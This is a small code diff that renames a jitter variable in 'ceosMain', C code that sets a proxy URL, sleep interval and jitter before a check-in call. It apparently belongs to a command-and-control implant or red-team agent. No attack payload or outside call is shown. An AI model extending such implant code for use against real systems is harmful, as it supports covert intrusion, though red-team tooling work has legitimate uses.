@@ -21,7 +21,7 @@ VOID ceosMain()
     ceosConfig->proxyURL = (PWCHAR)proxyurl;
     // Convert the sleeptime from seconds to miliseconds
     ceosConfig->sleeptime_ms = 1000 * sleep_time;
-    ceosConfig->jitter = jitter;
+    ceosConfig->jitter = jitter_perc;
 
     PParser ResponseParser = checkin();
     parseCheckin(ResponseParser);
